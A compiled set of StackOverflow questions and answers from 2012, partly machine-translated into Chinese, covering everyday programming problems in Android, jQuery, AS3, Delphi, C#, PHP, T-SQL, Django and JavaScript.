# StackOverflow 问答 10148000-10148999

# android - Error with class

> ID：10148001
> 
> 赞同：0
> 
> 时间：2012-04-13T20:39:17.157
> 
> 标签：android

I have a webview which has this class as webviewclient. This is to make links to pages open in the webview, and links to downloadable files open with the default browser. Here it is:

```
class LinkWebView extends WebViewClient {
public boolean shouldOverrideUrlLoading(WebView view, String url) {
    if (url.contains("/WS/") | url.contains("/Francesco/")
            | url.contains("/Gabriele/")) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setData(Uri.parse(url));
            ClubCiprianisActivity cca = new ClubCiprianisActivity();
            cca.comincia(intent);
        } catch (Exception ex) {
            ClubCiprianisActivity cca = new ClubCiprianisActivity();
            cca.tostizza(ex.getMessage());
        }
    } else {
        view.loadUrl(url);
    }
    return true;
} 
```

}

this webview will load only urls from a specific website so the conditional to choose wheter to open the link in the webview or in the default browser is correct for that website.

ClubCiprianisActivity is the only activity shown in my application, with the webview and all the rest.

method comincia of ClubCiprianisActivity is this:

```
public void comincia(Intent intent) {
    startActivity(intent);
} 
```

I had to make it because Eclipse doesn't recognize the method startActivity in the webviewclient class. tostizza is just showing a Toast because I can't do that either in the webviewclient class. My problem is that when I open al link to a webpage it opens normally, but when I try to open a downloadable link, going into the shouldoverride... I get an error.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T20:44:24.130

您永远不应该手动启动您的活动。而是在 LinkWebView 类中创建一个构造函数并将上下文作为参数发送到此构造函数，然后调用 context.startActivity(Intent)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-07-28T02:32:27.750

```
package com.example.maintosecond;

import android.os.Bundle;
import android.app.Activity;
import android.content.Intent;
import android.view.Menu; 
```

我有同样的问题，如果你导入 content.Intent 类，你应该很高兴。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-13T20:44:32.753

```
context.startActivity(intent); 
```

或者

```
 YourActivityname.this.startActivity(intent); 
```

# jquery - TextBox lose text when I hide it with jquery

> ID：10148009
> 
> 赞同：0
> 
> 时间：2012-04-13T20:39:58.493
> 
> 标签：jquery, google-chrome, textbox, show-hide

I am using Jquery to hide a textbox and show it when the user clicks a button

Hide:

```
$('#TextBox1').hide(); 
```

Show:

```
$('#TextBox1').show(); 
```

Everything works fine. But on google chrome, the textbox is losing its value. if the user type a text then hide it and show it again the textbox is empty.

This is happening only on google chrome. On firefox and explorer it works fine

Any idea about it?

Thanks

EDIT: There is something i forgot to mention is that i am hiding the DIV that contains the textbox and not the textbox itself here is the Jcode

```
 $("#EditName").click(function (event) {
        event.preventDefault();
        $("#TextBoxDIV").show();
    }
    $("#HideName").click(function (event) {
        event.preventDefault();
        $("#TextBoxDIV").hide();
    } 
```

and the textbox

```
 <div id = "TextBox1" class="TextFieldEditSmaller">
        @Html.TextBoxFor(m => m.Name) //This is an MVC3 application
    </div> 
```

EDIT2: I just noticed that the text is there but it is hidden behind something. if I CTRL + A inside the textbox and then I copy/Paste in notepad it shows

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T21:04:56.253

没有看到你的实际 html 代码很难说，但你可以做的是尝试隐藏实际的文本框然后 div，通过执行以下操作：

```
$("#HideName").click(function (event) {
    event.preventDefault();
    $("#TextBoxDIV").children(":first-child").hide();
    $("#TextBoxDIV").hide();
} 
```

如果这不起作用，您可以使用 jquerys 数据实用程序 [http://api.jquery.com/jQuery.data/存储文本](http://api.jquery.com/jQuery.data/)

然后重新填充显示的文本框。使用 [http://api.jquery.com/text/](http://api.jquery.com/text/)访问和设置 html 元素的文本内容 注意：我使用 .children(":first-child") 的原因是因为您的 mvc3 应用程序将被翻译成 html，我们不知道它的 id/class（如果有的话）到底是什么

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T20:45:36.980

它非常适合我。

这是我使用的代码：

```
 <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
<textarea>test</textarea>
<button>Hide</button><button>Show</button>

<script type="text/javascript">
$("button:first").on("click", function(json) {
    $("textarea").hide();
})
$("button").eq(1).on("click", function(json) {
    $("textarea").show();
})
</script> 
```

也许您发布完整代码，以便我们确定您的问题是什么？

# javascript - Facebook Like Button 创建 CSS 样式为 -2000px 的 div，在网站上创建白框

> ID：10148011
> 
> 赞同：0
> 
> 时间：2012-04-13T20:40:08.500
> 
> 标签：javascript, facebook, html, facebook-like

我正在使用标准的 HTML5 FB Like 插件，一切似乎都很好 - 直到我在我的网站上查看了一个冗长的页面，我注意到我的内容中间有两个框，远离 Facebook Like 按钮。我对 XFBML 版本也有同样的问题。

通过查看生成的按钮的代码，我可以看到 a`div`是在内部创建的`div id="fb-root">`，其样式设置为`position: absolute; top: -2000px;`.

如果你去[connect.facebook.net/en_US/all.js](http://connect.facebook.net/en_US/all.js)，你可以看到这是在第 26 行，第 2282 行创建和设置的。它说：`ga.style.position='absolute';ga.style.top='-2000px';`

**在小于此高度的页面上，您看不到这些框。但是在比这更长的页面上，会出现这些框。为什么？我怎样才能摆脱这些？我究竟做错了什么？**

按钮代码：

```
<div id="fb-root"></div>
<script>(function(d, s, id) {
        var js, fjs = d.getElementsByTagName(s)[0];
        if (d.getElementById(id)) return;
        js = d.createElement(s); js.id = id;
        js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=<my app id>";
        fjs.parentNode.insertBefore(js, fjs);
    }(document, 'script', 'facebook-jssdk'));</script>
        <div class="fb-like" data-href="<my page>" data-send="true" data-width="200" data-show-faces="true" 
             data-layout="button_count" data-action="like" data-font=\"arial\"></div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-14T00:14:24.100

如果您将元素放置在`fb-root`具有绝对或相对位置的元素内，则会发生这种情况，因为 -2000px 否则将相对于主体。

如果您将`fb-root`元素直接移动到正文中，那么这将不再发生。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T20:48:07.717

尝试添加：

```
ga.style.backgroundColor='transparent'; 
```

或者：

```
ga.style.visibility='hidden'; 
```

# android - 成功登录后将值附加到 TextView

> ID：10148016
> 
> 赞同：0
> 
> 时间：2012-04-13T20:40:48.013
> 
> 标签：android, android-intent

我的应用程序中有一个登录表单。我想在用户成功登录后显示“欢迎”消息。从登录屏幕移动到主屏幕时，我将用户 ID 作为值传递给意图，如下所示：

```
Intent intent = new Intent(this,ApplicationHomeActivity.class);
intent.putExtra("UserId", txtUserId.getText().toString());
startActivity(intent); 
```

然后在主屏幕中，我在 layout.xml 文件中将 TextView 值设置为“Welcome”，因为“Welcome”部分是所有用户的常量字符串。然后我使用以下代码获取用户名：

```
Bundle bundle = getIntent().getExtras();
String userId = bundle.getString("UserId"); 
```

现在我想将 userId 附加到 TextView（在 layout.xml 中包含“欢迎”）并将其显示给用户。我找不到任何 append() 方法，因此我无法将 userId 附加到“Welcome”。那该怎么做呢？在这方面需要一些帮助。

问候，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T20:43:48.820

您需要自己附加它：

```
txtUserId.setText(txtUserId.getText().toString() + appendedText); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T20:44:28.477

只是这样做`"Welcome" + userID`这会将用户ID附加到欢迎文本

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T20:47:08.850

您可以在资源中定义欢迎字符串，`Welcome $1%s`然后

```
txtUserId.setText(getString(R.string.welcome, bundle.getString("UserId")); 
```

见[http://developer.android.com/reference/android/content/Context.html#getString%28int,%20java.lang.Object...%29](http://developer.android.com/reference/android/content/Context.html#getString%28int,%20java.lang.Object...%29)

# xml - (AS3) 以数字/降序从 XML 加载缩略图

> ID：10148024
> 
> 赞同：0
> 
> 时间：2012-04-13T20:41:21.053
> 
> 标签：xml, actionscript-3, gallery, thumbnails, loader

自从我开始调试我的代码以使其工作以来，已经有 2 天了，而且它正在占用我所有的时间，如果我不开始询问，我认为我不会达到我的最后期限。

我不是专业人士，所以请对代码保持温和。:D

图库运行良好，可以顺利加载缩略图而不会返回任何错误。但是，缩略图没有按预期加载，我认为是因为最小的文件大小首先加载。因此，如果 thumbnail[3] 是最小的，它将自己附加到 thumbnail_container[0] ，它应该始终是 thumbnail[0] 到 thumbnail_container[0] 等等。

这是我的代码：

```
 //THIS IS THE CONTAINER         
        for (var i:int = 0; i < thumbBatches[aj]; i++)
        {
            thumbX = 44.35 + (thumbWidth + 18) * i;
            var itemThumb:thumbH = new thumbH();
            itemThumb.x = thumbX;
            itemThumb.y = thumbY;
            itemThumb.name = "" + i + (8 * aj);
            itemThumb.addEventListener(MouseEvent.CLICK, openFullItem);
            level2.addChild(itemThumb);
            IthumbList[i + (8 * aj)] = itemThumb;
        }

        //THIS WILL LOAD THE THUMBNAILS
        for (var n:int = 0; n < potteryIDnum.length; n++)
        {
            var imgLoader:Loader = new Loader();
            imgLoader.contentLoaderInfo.addEventListener(Event.COMPLETE, loadComplete);
            imgLoader.load(new URLRequest(potteryThumbs[n]));
        }

        // AFTER LOADING IT, IT'LL BE ASSIGNED TO AN ARRAY
       // THEN AFTER THE LAST IMAGE HAS BEEN LOADED WILL BE ATTACHED TO THE CONTAINER
        function loadComplete(e:Event):void
        {
            IthumbImages.push(e.target.content);
            if (IthumbList.length == IthumbImages.length)
            {
                for (var k:int = 0; k < IthumbImages.length; k++)
                {
                    var fadeInThumbs:Tween = new Tween(IthumbList[k],"alpha",Strong.easeInOut,0,1,0.3 * (k + 0.5),true);
                    IthumbList[k].addChild(IthumbImages[k]);
                }
            }
        } 
```

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T21:05:38.013

我认为你的问题在于这条线。

```
 IthumbList[i + (8 * aj)] = itemThumb; 
```

什么是**aj**？
如果 aj == 1 且 i == 1 则数组的索引将为 9
如果 aj == 2 且 i == 1 则数组的索引将为 16

因此，您的 oncomplete 中的 for 循环应该会失败。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-14T13:05:36.427

我已经回答了[类似的问题](https://stackoverflow.com/questions/9953734/urlloader-loads-multi-files-and-the-result-order-is-the-same-as-call-load/9954988#9954988)。然而，那是关于`URLLoader`课堂的。

对于`Loader`类 case ，它应该是：

```
 dynamic class DynamicLoader extends Loader{} 
```

最后，修改后的代码：

```
 var remainingLoads:uint = potteryIDnum.length; 
    //THIS WILL LOAD THE THUMBNAILS
    for (var n:int = 0; n < potteryIDnum.length; n++)
    {
        var imgLoader:DynamicLoader = new DynamicLoader();
        imgLoader.index = n;
        imgLoader.contentLoaderInfo.addEventListener(Event.COMPLETE, loadComplete);
        imgLoader.load(new URLRequest(potteryThumbs[n]));
    }

    // AFTER LOADING IT, IT'LL BE ASSIGNED TO AN ARRAY
    // THEN AFTER THE LAST IMAGE HAS BEEN LOADED WILL BE ATTACHED TO THE CONTAINER
    function loadComplete(e:Event):void
    {
        IthumbImages[ DynamicLoader(e.target.loader).index ] = e.target.content;
        if (--remainingLoads == 0)
        {
            for (var k:int = 0; k < IthumbImages.length; k++)
            {
                var fadeInThumbs:Tween = new Tween(IthumbList[k],"alpha",Strong.easeInOut,0,1,0.3 * (k + 0.5),true);
                IthumbList[k].addChild(IthumbImages[k]);
            }
        }
    } 
```

# jprofiler - JProfiler 运行时间与实际加载时间不同

> ID：10148028
> 
> 赞同：3
> 
> 时间：2012-04-13T20:41:46.263
> 
> 标签：jprofiler

我们在使用 JProfiler 7.1.1 时遇到了一个奇怪的问题，它显示给定 HTTP 请求的经过时间与使用 Firebug 或手动测试获得的完全不同 - 2.5 秒与 7.5 秒相比。使用默认会话设置。JProfiler 一直被证明是可靠的，我对这种行为有点难过。

任何想法为什么？

谢谢！

**Update 1** YourKit 也提供了准确的结果，因此这显然与 JProfiler 有关。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-15T14:17:33.027

默认情况下，JProfiler 显示处于**可运行线程状态**的时间，而不是经过的时间。如果要查看经过的时间，请将右上角的线程状态选择器调整为“所有状态”。

有关详细信息，请参阅[此截屏视频](http://blog.ej-technologies.com/2009/07/thread-states-in-cpu-profiling-views.html)。

# android - 从“使用（短信应用程序）完成操作”屏幕启动应用程序时，如何获取联系号码+姓名？

> ID：10148030
> 
> 赞同：0
> 
> 时间：2012-04-13T20:41:53.613
> 
> 标签：android, sms, contact

我最近发现了在设备主联系人屏幕中选择发送短信时如何从“使用完成操作”屏幕启动我的短信应用程序，

但是我很难从我选择的要发送消息的联系人那里获取任何详细信息，并将这些详细信息（电话号码和收件人姓名）放入编辑文本框中，

如果有人能告诉我如何让我的应用程序在启动时获取收件人的详细信息并将它们放在适当的 EditText/TextView 框中，我将非常感激thanx。

PS，我不确定这是否重要，但无论如何我会提到，我的应用程序适用于 Android 2.1+，所以我不必担心 2.1 之前的兼容性。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-16T15:17:58.880

啊，所以要获取电话号码，我使用了以下代码

```
String phoneNumber = getIntent().getDataString(); 
```

但我仍在努力找出如何获取选定的联系人姓名：\

# delphi - 为 TPageProducer 回调中的 unicode 支持打补丁的 Delphi 库？

> ID：10148036
> 
> 赞同：1
> 
> 时间：2012-04-13T20:42:13.067
> 
> 标签：delphi, winapi, http, indy

我一直在使用 Delphi 2009 和附带的 Indy 库 (10)，并且一直在升级大量使用 TPageProducer 的遗留应用程序。旧版应用程序最初是为 Delphi 5 / Indy 8 编写的。

我正在使用 TPageProducer 的 OnHTMLTag 属性来指定一个函数，该函数将处理我的源代码中的 HTML 透明标签。我的问题是，如果我将 unicode（简体中文）字符放在 TPageProducer.HTMLDoc 属性中，当调用 OnHTMLTag 回调时，TagParams 参数包含 ?? 而不是预期的汉字。

我将其追溯到 HTTPApp.pas 的第 2053 行左右，我们在其中分离出透明标签的键/值对：

```
procedure ExtractHeaderFields(Separators, WhiteSpace: TSysCharSet; Content: PChar;
  Strings: TStrings; Decode: Boolean; StripQuotes: Boolean = False);

...
if Decode then
  Strings.Add(string(HTTPDecode(AnsiString(DoStripQuotes(ExtractedField)))))
else
  Strings.Add(DoStripQuotes(ExtractedField));
... 
```

一切都很好，直到我们将字符串转换为 AnsiString 并将其传递给 HTTPDecode，此时我的字符串列表包含 ?? 我的最终 TagParams 和网页也是如此。

是否应该有一个使用字符串而不是 AnsiStrings 的 HTTPDecode 版本？如果是这样，我在哪里可以找到这个？

目前，当我为 TPageProducer 解析我的令牌时，我刚刚禁用了解码例程，但这不是一个很好的解决方案，并且希望有一个适用于宽字符的版本（如果这甚至可能的话）。

# gwt - GWT - RichTextArea - 如何重置文本并保持格式

> ID：10148046
> 
> 赞同：0
> 
> 时间：2012-04-13T20:43:08.043
> 
> 标签：gwt

我试图在 GWT 2.3 中为 RichTextArea 设置重置功能，但我遇到了两个问题

*   A) RichTextAarea 包含格式
*   B）如果我 setText("") 格式将成为默认格式

也许我错过了一些东西：S 所以我的问题是......在 RichTextArea中是否有标准的**重置功能方式？**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T20:46:01.567

尝试全选，然后用空字符串替换

# c# - 我什么时候在 using 指令上使用别名？

> ID：10148053
> 
> 赞同：5
> 
> 时间：2012-04-13T20:43:43.970
> 
> 标签：c#

所以我正在阅读 MSDN 文档并遇到：

[http://msdn.microsoft.com/en-us/library/sf0df423.aspx](http://msdn.microsoft.com/en-us/library/sf0df423.aspx)

`using`对指令使用别名有什么实际用途？

我明白它的作用，我只是不明白为什么我想使用它。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-13T20:45:57.277

如果您在两个不同的命名空间中有一个同名的类，这将很有用。当这种情况发生时，你有两个选择。 `using`一个命名空间而不是另一个命名空间（意味着对另一个命名空间使用完全限定的名称），或者`using`一个命名空间通常使用另一个命名空间，而`using`另一个命名空间具有别名。由于别名比完全限定名称短，它仍然更容易和更方便。

显然，最好的选择是在不同的命名空间中不要有同名的公共类，特别是如果有人想在同一个类中同时使用这两个类。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-13T20:48:44.387

例如，您可能在您的类 2 中使用具有相同名称但在不同命名空间中的其他类。例如：

```
 using TextBoxForms = System.Windows.Forms.TextBox
 using TextBoxWeb = System.Web.UI.WebControls.TextBox 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-04-13T20:58:56.647

我喜欢将它用于泛型，因为有时将它们写出来可能会非常冗长。

```
using NatMap = System.Collections.Generic.Dictionary<IPAddress, IPAddress[]>;
...
NatMap natMap = new NatMap(); 
```

使用函数时：

```
void PrintNat(NatMap natMap) {
    foreach (IPAddress[] addresses in natMap) {
        foreach (IPaddress address in addresses) {
            // bla bla bla
        }
    }
} 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-04-13T20:47:17.760

从那个链接

> 创建 using 别名，以便更轻松地将标识符限定为命名空间或类型。using 别名指令的右侧必须始终是完全限定类型，而不管它之前的 using 指令。

所以你可能会改变一个类型

```
Foo.Bar.Foo.Bar.Foo.Bar.Foo.Bar.Foo.Bar.Foo.Bar 
```

对于更易于管理的东西，例如

```
FooBar 
```

特别是如果您有多个冲突的命名空间

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-04-13T20:48:18.307

例如，当您想要来自不同名称空间的两个具有相同名称的类的短名称时，您可以使用它。如果您指定命名空间，则类名冲突，因此您可以给它们不同的名称：

```
using ImageControl = System.Windows.Controls.Image;
using Image = System.Drawing.Image; 
```

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2012-04-13T21:33:35.337

使用它有两个非常好的理由：

1.  存在名称冲突（两个具有相同名称的不同名称空间中的类）。除了写出完全限定的类型（包括完整的命名空间）之外，您还可以将其中一个别名改为一个更短但同样具有描述性的名称。

    一种。示例：假设您有一个包含类的项目，`KeyValuePair<TKey, TValue>`并且您还将 System.Collections.Generic 用于其他内容。你可以给你的类起别名`using MyStringIntPair = MyProject.Collections.Generic.KeyValuePair<string, int>`，你的代码看起来会更干净，因为没有`MyProject.Collections.Generic`到处都是。

2.  本机互操作。`long`在处理本机类型时，我个人发现这非常有用。在大多数操作系统上，a`long`与指针大小相同，但在 Windows 64 位上，它与 int 相同。所以对于大多数操作系统，我可以将 a 表示`long`为`IntPtr`，但它需要为 Windows 64 位更改，所以我创建了一个类型别名并使用预处理器指令更改它的定义。

    一种。FreeType 使用`long`了很多，所以当我为它编写绑定时，我必须让它在 Windows 64 位上也能工作。我正在考虑某种基于操作系统的动态子类化，但预处理器指令和类型别名更简单，现在可以完成工作。[一个例子是 FT_BBox 结构，它使用 longs](https://github.com/Robmaister/SharpFont/blob/master/SharpFont/Internal/BBoxRec.cs)。

以下 FT_BBox 结构的简化相关版本：

```
using System;
using System.Runtime.InteropServices;

#if WIN64
using FT_Pos = System.Int32;
#else
using FT_Pos = System.IntPtr;
#endif

namespace SharpFont.Internal
{
    /// <summary>
    /// Internally represents a BBox.
    /// </summary>
    /// <remarks>
    /// Refer to <see cref="BBox"/> for FreeType documentation.
    /// </remarks>
    [StructLayout(LayoutKind.Sequential)]
    internal struct BBoxRec
    {
        internal FT_Pos xMin, yMin;
        internal FT_Pos xMax, yMax;
    }
} 
```

# php - 如何检查文本框是否为空且值小于500

> ID：10148054
> 
> 赞同：0
> 
> 时间：2012-04-13T20:43:45.637
> 
> 标签：php, if-statement

我有一个文本框，它是供用户输入数字的可选字段。如果那里有一个数字，我想检查以确保它小于 500，然后对其进行处理。

这是我目前正在做的事情：

```
if($textbox!="" && <=500)
{
//action here
} 
```

我尝试用 andif 替换 && 但仍然收到错误**Parse error: syntax error, unexpected T_IS_SMALLER_OR_EQUAL**

最简单的方法是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-13T20:45:09.993

您需要在两个语句中使用变量 preg_match('/\d/', $textbox ) == 1 将确保它是一个 int

```
if($textbox!="" && $textbox <= 500 && preg_match('/\d/', $textbox ) == 1)
{
//action here
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T20:46:54.470

你错过了小于的左边部分

```
if($textbox!="" && $textbox <=500)
{
//action here
} 
```

# sql - 在 EXEC() 后无法获得 @@ERROR 并出现错误

> ID：10148061
> 
> 赞同：4
> 
> 时间：2012-04-13T20:44:20.363
> 
> 标签：sql, sql-server, sql-server-2008, tsql

请看下面的 t-sql 代码

```
 DECLARE @iError INT
   EXEC('select * from sysobj')
   SELECT @iError = @@ERROR
   PRINT 'Error = ' + CAST(@iError AS VARCHAR(10)) 
```

在我运行它之后，它会返回错误消息，这就是我想要的。

> 消息 208，级别 16，状态 1，第 1 行
> 无效的对象名称“sysobj”。
> 错误 = 208

但是，如果我更改查询

```
 DECLARE @iError INT
   EXEC('select * from sysobjects where ''c'' = 1')
   SELECT @iError = @@ERROR
   PRINT 'Error = ' + CAST(@iError AS VARCHAR(10)) 
```

输出将是

> 消息 245，级别 16，状态 1，行 1
> 将 varchar 值“c”转换为数据类型 int 时转换失败。

问题是 EXEC() 之后的任何代码都没有执行。

在真正的存储过程中，我有一些代码来处理 PRINT 之后的错误。并且这些代码都没有在第二种情况下执行。

有人可以让我知道为什么会这样吗？

我在 SQL Server 2008 和 2005 上都对其进行了测试。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-13T21:29:27.630

不同的错误会有不同的中止级别，其中一些可以通过使用设置来控制，例如 ARITHIGNORE 和 ANSI_WARNINGS。

我建议阅读以下详细解释所有这些的文章。

[http://www.sommarskog.se/error-handling-I.html#whathappens](http://www.sommarskog.se/error-handling-I.html#whathappens)

语句终止和批量中止

这两组包括常规运行时错误，例如唯一索引中的重复项、磁盘空间不足等。正如我已经讨论过的，事先并不总是容易预测哪个错误会导致哪个操作。此表列出了一些常见错误，以及它们是中止当前语句还是中止整个批处理。

![在此处输入图像描述](../Images/c33b7277cb0979290f3935c1f176b772.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T20:49:25.157

研究为您的错误处理实施[TRY...CATCH 。](http://msdn.microsoft.com/en-us/library/ms179296%28v=sql.105%29.aspx)然后，您应该能够将所有错误处理放在 CATCH 块中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-13T21:59:35.293

msdn 上有一篇关于此的[文章](http://msdn.microsoft.com/en-us/library/aa175921%28v=SQL.80%29.aspx)。它与`EXEC()`运行语句的上下文有关。如果您在传递给的参数中包含错误陷阱`EXEC()`，您可以将其填充到临时表中，然后查看。

这是他们的例子：

```
DECLARE @cmd VARCHAR(1000), @ExecError INT

CREATE TABLE #ErrFile (ExecError INT)

SET @cmd = 'EXEC GetTableCount ' + 
'''pubs.dbo.authors''' + 
'INSERT #ErrFile VALUES(@@ERROR)'

EXEC(@cmd)

SET @ExecError = (SELECT * FROM #ErrFile)

SELECT @ExecError AS '@@ERROR' 
```

# actionscript-3 - AS3 确定 MovieClip 是否完全填充另一个 MovieClip

> ID：10148063
> 
> 赞同：0
> 
> 时间：2012-04-13T20:44:25.950
> 
> 标签：actionscript-3, flash

我试图在 AS3 Flash 中确定舞台上的可拖动影片剪辑是否完全填满了舞台上的另一个影片剪辑。我用这段代码查看了另一篇 StackOverflow 文章：

`var inter = mcOverlay.getRect(this).intersection(mcLoadedImage.getRect(this));`

 ````
 if ((inter.width * inter.height) == 0) {
        return false;
    } else {
        return true;
    } 
````  `此代码使用 intersect 方法，它有效，但我还想检查动画剪辑是否完全被舞台上的可拖动动画剪辑覆盖。

有什么建议么？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T20:54:54.577

不要使用交集，而是使用 Rectangle.contains。

```
var contains : Boolean = mcContainer.getRect(this).contains(mcContained.getRect(this)); 
```

[http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/geom/Rectangle.html#containsRect](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/geom/Rectangle.html#containsRect) ()

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T21:05:04.817

我认为您可以使用比较每个movieclips rect，即比较左、右、顶和底值。`

# django - 我可以在没有测试客户端的情况下访问测试视图的响应上下文吗？

> ID：10148072
> 
> 赞同：10
> 
> 时间：2012-04-13T20:44:49.510
> 
> 标签：django, django-views, django-testing

我有一个从单元测试调用的函数。通过设置一些调试跟踪，我知道该函数就像一个魅力一样工作，并且所有值都正确准备好返回。

这就是我的测试代码的样子（看看我的 ipdb.set_trace() 在哪里）：

```
@override_settings(REGISTRATION_OPEN=True)
def test_confirm_account(self):
    """ view that let's a user confirm account creation and username
        when loggin in with social_auth """    
    request = self.factory.get('')
    request.user = AnonymousUser()
    request.session={}
    request.session.update({self.pipename:{'backend':'facebook',
                                           'kwargs':{'username':'Chuck Norris','response':{'id':1}}}})

    # this is the function of which i need the context:
    response = confirm_account(request)
    self.assertEqual(response.context['keytotest'],'valuetotest') 
```

根据我[从这部分 Django 文档中](https://docs.djangoproject.com/en/1.4/topics/testing/#testing-responses)了解到的情况，当我使用测试客户端时，我将能够访问 response.context。但是当我尝试像我那样访问 response.context 时，我得到了这个：

> AttributeError：“HttpResponse”对象没有属性“上下文”

有没有办法在不使用客户端的情况下获取客户端的特殊 HttpResponse 对象？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-07-19T02:16:47.463

RequestFactory 不涉及 Django 中间件，因此，您不会生成上下文（即没有 ContextManager 中间件）。

如果要测试上下文，则应使用测试客户端。您仍然可以使用*模拟*或简单地在测试中提前保存会话来操纵测试客户端中请求的构造，例如：

```
from django.test import Client
c = Client()
session = c.session
session['backend'] = 'facebook'
session['kwargs'] = {'username':'Chuck Norris','response':{'id':1}}
session.save() 
```

现在，当您使用测试客户端加载视图时，您将使用您设置的会话，当您使用 时`response = c.get('/yourURL/')`，您可以`response.context`根据需要引用响应上下文。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2016-10-24T14:36:06.787

对于新的 django 版本，“response.context”不正确，但您可以使用 response.context_data 来获取传递给 TemplateResponse 的相同上下文。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-11-19T11:23:44.040

虽然这是一篇旧帖子，但我想这个提示可能会有所帮助。您可以研究使用`TemplateResponse`(or `SimpleTemplateResponse`) 可以替代`render`or `render_to_response`。

[Django 文档](https://docs.djangoproject.com/en/1.8/ref/template-response/)对此有更多了解

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-06-07T19:02:57.420

是的你可以。您必须修补渲染。

我正在使用 pytest-django

```
class Test:
    def context(self, call_args):
        args, kwargs = call_args
        request_mock, template, context = args
        return context

    @patch('myapplication.views.render')
    def test_(self, mock_render, rf):
        request = rf.get('fake-url')
        view(request)
        context = self.context(mock_render.call_args)

        keytotest = 'crch'
        assert keytotest == context['keytotest'] 
```

* * *

## 回答 #5

> 赞同：-5
> 
> 时间：2012-04-13T22:33:24.667

上下文（原文如此！）可以在 Response 类中找到。如您所见，它是您从视图函数返回的**HTTP响应。**发生这种情况是因为您直接调用了它。通过测试客户端调用这个函数就可以了。

```
response = client.get('/fobarbaz/')
response.context 
```

# javascript - 原型函数打印自己而不是结果

> ID：10148073
> 
> 赞同：0
> 
> 时间：2012-04-13T20:44:51.057
> 
> 标签：javascript, prototype

我在这里回答了一个问题[是否有 JavaScript 等价于 ruby​​s“#{}”序列？](https://stackoverflow.com/questions/10144407/is-there-a-javascript-equivalent-of-rubys-sequences/10147398#10147398)当我遇到 javascript 原型问题时。我想提供第一个工作函数的另一种方式，它提供了一种打印、格式化和连接字符串的 ruby​​ 方式。为什么正常功能起作用而原型功能不起作用？

```
<script>
function p(str){
  document.write(str.replace(/#{(\w)}/g, function(match, s){return eval(s)})+"<br>");
}

String.prototype.p = function() {
  return this.replace(/#{(\w)}/g, function(match, s){return eval(s)})+"<br>";
};

var f="foo", b="bar"
p("#{f} #{b}")
document.write("#{f} #{b}".p);

</script> 
```

这给了

```
foo bar
function () { return this.replace(/#{(\w)}/g, function(match, s){return eval(s)})+"
"; } 
```

第一行是正确的，它是连接的字符串，第二行是打印的函数本身，而不是结果..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T20:49:15.447

`"#{f} #{b}".p`指的是函数本身（String.p），因为“#{f} #{b}”是一个字符串。

你想让`"#{f} #{b}".p()`它打印 foo bar。

# android - 亚行不承认三星 Galaxy S？

> ID：10148083
> 
> 赞同：3
> 
> 时间：2012-04-13T20:45:43.813
> 
> 标签：android, adb, samsung-mobile

USB 调试已启用，我的 mac 识别出手机已连接，但 eclipse 并未将其列为设备，我无法测试我的应用程序。我正在使用带有 OSX 的 macbook air，而 Eclipse 无法识别我的设备？我知道有些人对 mac 有这个问题，但我找不到解决方案。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-12-22T05:53:07.320

我已经安装了“ **google-usb-driver** ”包（出现在 SDK 管理器的 extras 小节中）并且还在我的三星 S3 上**启用了调试。**然而 eclipse/adb 无法识别该设备。

**为了在windows**上解决这个问题，我安装了**kies**。我现在可以在设备列表中（在设备管理器中）看到一个名为“samsung android phone”的新设备。

默认情况下，Windows(7/2008) 没有驱动程序，这可以从 kies 设置中获得。现在我的设备管理器显示 2 个设备：

1.  便携式设备 > GT-I93XX（在安装 kies 之前已经有这个）
2.  三星安卓手机 > 三星**安卓 ADB 接口**。（这是安装凯斯后的新功能）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-02T04:33:00.383

有时 USB 电缆可能有问题，我发现 Kindle 的电缆比三星或摩托罗拉提供的电缆更可靠（原因我不知道！）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T20:51:25.923

您可能需要安装一些三星驱动程序软件。在 Windows 上，至少 adb 驱动程序与他们的 kies 桌面软件捆绑在一起。我会首先找到它的mac版本并安装它。

